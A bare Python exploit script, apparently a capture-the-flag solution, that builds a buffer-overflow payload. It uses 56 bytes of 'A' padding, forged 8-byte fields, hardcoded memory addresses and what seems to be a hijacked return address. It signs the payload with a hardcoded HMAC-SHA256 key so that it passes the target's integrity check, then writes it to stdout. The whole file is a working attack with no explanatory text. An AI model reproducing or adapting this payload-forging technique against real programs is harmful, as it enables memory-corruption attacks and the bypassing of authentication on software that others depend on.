#!/usr/bin/env python3

import sys
import hashlib
import hmac

# length = b'\x38\x00\x00\x00\x00\x00\x00\x00'

message_txt = ('A'*56).encode()
one = 0x0000000000000000.to_bytes(8, 'little')
two = 0x0000000000000001.to_bytes(8, 'little')
three = 0x0000000000000000.to_bytes(8, 'little')
four = 0x0000000000000000.to_bytes(8, 'little')
five = 0x0000000000000000.to_bytes(8, 'little')
six = 0x0000000000406490.to_bytes(8, 'little')
seven = 0x00000000004052a0.to_bytes(8, 'little')
lol = b'\x00'*8
blink = 0x4016d3.to_bytes(8,'little')
message = message_txt+one+two+three+four+five+six+seven+lol+blink
length1 = len(message).to_bytes(8,'little')

key = 0x4507abd7e85f1921.to_bytes(8, 'little')
key2 = 0xa5e06df4e28617a0.to_bytes(8, 'little')
key3 = 0xd3a0b80bae20bc86.to_bytes(8, 'little')
key4 = 0xf18803e653234fe5.to_bytes(8, 'little')

combined = key+key2+key3+key4

signature = hmac.new(combined, message, hashlib.sha256).digest()
sys.stdout.buffer.write(length1+message+signature)